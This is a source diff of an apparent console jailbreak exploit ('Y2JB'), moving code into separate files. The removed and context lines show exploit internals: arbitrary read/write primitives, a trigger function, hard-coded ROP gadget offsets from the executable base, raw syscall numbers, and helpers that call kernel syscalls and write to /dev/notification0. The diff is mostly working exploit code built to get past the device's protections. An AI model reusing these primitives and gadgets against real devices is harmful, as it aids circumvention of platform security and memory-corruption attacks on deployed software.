@@ -8,85 +8,8 @@
 const version_string = "Y2JB 1.2 beta by Gezine";
 
 let NETWORK_LOGGING = false;
+// Use setlogserver.js payload to change server url at runtime
 let LOG_SERVER = 'http://192.168.1.180:8080/log';
-
-// Global functions
-let addrof;
-let read64;
-let write64;
-let create_fakeobj;
-let read8;
-let write8;
-let read16;
-let write16;
-let read32;
-let write32;
-let get_backing_store;
-let malloc;
-let write_string;
-let alloc_string;
-let pwn;
-let get_bytecode_addr;
-let call_rop;
-let call;
-let syscall;
-let send_notification;
-let sysctlbyname;
-let get_fwversion;
-
-// Global objects
-let allocated_buffers = [];
-let eboot_base = 0n;
-let libc_base;
-let return_value_addr;
-let libkernel_base;
-let syscall_wrapper;
-let firmwareVersion;
-let rop_chain;
-let fake_bc;
-let fake_frame;
-let return_value_buf;
-let saved_fp = 0x0n;
-
-// File flags
-let O_WRONLY = 0x1n;
-let O_RDONLY = 0x0n;
-let O_RDWR = 0x2n;
-
-let SYSCALL = {
-    read: 0x3n,
-    write: 0x4n,
-    open: 0x5n,
-    close: 0x6n,
-    getuid: 0x18n,
-    getsockname: 0x20n,
-    accept: 0x1en,
-    socket: 0x61n,
-    connect: 0x62n,
-    bind: 0x68n,
-    setsockopt: 0x69n,
-    listen: 0x6an,
-    getsockopt: 0x76n,
-    sysctl: 0xcan,
-    netgetiflist: 0x7dn,
-};
-
-let ROP = {
-    get pop_rsp()             { return eboot_base + 0x49f7fn;   },
-    get pop_rax()             { return eboot_base + 0x2d954n;   },
-    get pop_rdi()             { return eboot_base + 0xb0ec5n;   },
-    get pop_rsi()             { return eboot_base + 0xb8a81n;   },
-    get pop_rdx()             { return eboot_base + 0xb692n;    },
-    get pop_rcx()             { return eboot_base + 0x187da3n;  },
-    get pop_r8()              { return eboot_base + 0x1a8ff9n;  },
-    get pop_r9()              { return eboot_base + 0x1394e01n; },
-    get pop_rbp()             { return eboot_base + 0x69n;      },
-    get mov_qword_rdi_rax()   { return eboot_base + 0x49a77n;   },
-    get mov_qword_rdi_rdx()   { return eboot_base + 0x3a3b95n;  },
-    get mov_rax_0x200000000() { return eboot_base + 0x1283d40n; },
-    get mov_rsp_rbp()         { return eboot_base + 0xb1424n;   },
-    get ret()                 { return eboot_base + 0x32n;      },
-};
 
 async function checkLogServer() {
     try {
@@ -183,6 +106,8 @@ function trigger() {
     Promise.any.call(f0, [v3]);
     return v1[1];
 }
+
+load_localscript('global.js');
 
 (async function() {
     try {
@@ -686,32 +611,6 @@ function trigger() {
             return backing_store;
         }
         
-        // Write UTF-8 string to existing buffer
-        write_string = function(addr, str) {
-            const encoder = new TextEncoder();
-            const bytes = encoder.encode(str);
-            
-            for (let i = 0; i < bytes.length; i++) {
-                write8(addr + BigInt(i), bytes[i]);
-            }
-            
-            write8(addr + BigInt(bytes.length), 0);
-        }
-        
-        alloc_string = function(str) {
-            const encoder = new TextEncoder();
-            const bytes = encoder.encode(str);
-            const addr = malloc(bytes.length + 1);
-            
-            for (let i = 0; i < bytes.length; i++) {
-                write8(addr + BigInt(i), bytes[i]);
-            }
-            
-            write8(addr + BigInt(bytes.length), 0);
-            
-            return addr;
-        }
-        
         await log("Stable primitive achieved");
         
         await log("Setting up ROP...");
@@ -950,35 +849,7 @@ function trigger() {
             return return_value_buf[0];
         }
         
-        send_notification = function(text) {
-            const notify_buffer_size = 0xc30n;
-            const notify_buffer = malloc(Number(notify_buffer_size));
-            const icon_uri = "cxml://psnotification/tex_icon_system";
-                                
-            // Setup notification structure
-            write32(notify_buffer + 0x0n, 0);           // type
-            write32(notify_buffer + 0x28n, 0);          // unk3
-            write32(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
-            write32(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
-            
-            // Write message at offset 0x2D
-            write_string(notify_buffer + 0x2dn, text);
-            
-            // Write icon URI at offset 0x42D
-            write_string(notify_buffer + 0x42dn, icon_uri);
-            
-            // Open /dev/notification0
-            const dev_path = alloc_string("/dev/notification0");
-            const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
-            
-            if (Number(fd) < 0) {
-                return;
-            }
-            
-            syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
-            syscall(SYSCALL.close, fd);
-            
-        }
+        load_localscript('misc.js');
         
         if (psn_matches >= 1 && yt_matches >= 1) {
             send_notification("PSN dialog disabled\nSafe to close PSN sign out dialog now");
@@ -989,46 +860,6 @@ function trigger() {
         }
         
         await checkLogServer();
-        
-        sysctlbyname = function(name, oldp, oldp_len, newp, newp_len) {
-            const translate_name_mib = malloc(0x8);
-            const buf_size = 0x70;
-            const mib = malloc(buf_size);
-            const size = malloc(0x8);
-            
-            write64(translate_name_mib, 0x300000000n);
-            write64(size, BigInt(buf_size));
-            
-            const name_addr = alloc_string(name);
-            const name_len = BigInt(name.length);
-            
-            if (syscall(SYSCALL.sysctl, translate_name_mib, 2n, mib, size, name_addr, name_len) < 0n) {
-                throw new Error("failed to translate sysctl name to mib (" + name + ")");
-            }
-            
-            if (syscall(SYSCALL.sysctl, mib, 2n, oldp, oldp_len, newp, newp_len) < 0n) {
-                return false;
-            }
-            
-            return true;
-        }
-        
-        
-        get_fwversion = function() {
-            const buf = malloc(0x8);
-            const size = malloc(0x8);
-            write64(size, 0x8n);
-            
-            if (sysctlbyname("kern.sdk_version", buf, size, 0n, 0n)) {
-                const byte1 = Number(read8(buf + 2n));  // Minor version (first byte)
-                const byte2 = Number(read8(buf + 3n));  // Major version (second byte)
-                
-                const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
-                return version;
-            }
-            
-            return null;
-        }
         
         firmwareVersion = get_fwversion();
         
